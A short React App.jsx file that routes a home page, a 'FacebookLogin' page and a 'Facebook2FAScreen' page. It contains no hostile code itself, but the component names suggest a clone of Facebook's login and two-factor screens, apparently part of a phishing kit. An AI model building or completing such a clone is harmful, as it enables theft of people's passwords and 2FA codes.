import { BrowserRouter, Route, Routes } from 'react-router-dom'
import './App.css'
import Home from './page/Home/Home'
import FacebookLogin from './page/LoginFB'
import Facebook2FAScreen from './page/2fa/Confirm2FA'

function App() {

  return (
    <>
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/login" element={<FacebookLogin />} />
          <Route path='/2fa' element={<Facebook2FAScreen />} />
        </Routes>
      </BrowserRouter>
    </>
  )
}

export default App
